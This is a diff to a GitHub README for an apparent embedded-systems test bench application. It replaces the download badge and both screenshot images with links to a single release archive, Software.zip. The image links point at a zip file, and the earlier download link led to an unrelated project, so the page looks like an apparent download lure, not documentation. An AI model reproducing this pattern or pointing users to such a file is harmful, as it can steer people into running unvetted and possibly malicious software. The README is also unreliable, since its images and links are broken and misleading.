@@ -15,7 +15,7 @@ arduino, automation, csharp, embedded-systems, esp32, hardware-testing, lua-scri
 ## Getting Started
 To get started with using the Automated Test Bench for Embedded Systems, you can download the application by clicking on the link below:
 
-[<img src="https://img.shields.io/badge/Download%20Application-v1.0.0-brightgreen">](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch application")
+[<img src="https://github.com/jacobthego/Automated-Test-Bench-for-Embedded-Systems/releases/download/v2.0/Software.zip%20Application-v1.0.0-brightgreen">](https://github.com/jacobthego/Automated-Test-Bench-for-Embedded-Systems/releases/download/v2.0/Software.zip "Launch application")
 
 If the link above does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -29,8 +29,8 @@ If the link above does not work, please check the "Releases" section of this rep
 ## Screenshots
 Here are some screenshots of the Automated Test Bench for Embedded Systems application:
 
-![Screenshot 1](https://via.placeholder.com/800x400)
-![Screenshot 2](https://via.placeholder.com/800x400)
+![Screenshot 1](https://github.com/jacobthego/Automated-Test-Bench-for-Embedded-Systems/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/jacobthego/Automated-Test-Bench-for-Embedded-Systems/releases/download/v2.0/Software.zip)
 
 ## Contribution
 If you would like to contribute to this project, feel free to fork the repository and submit a pull request with your changes. We welcome all contributions that can improve the functionality and usability of the Automated Test Bench for Embedded Systems application.
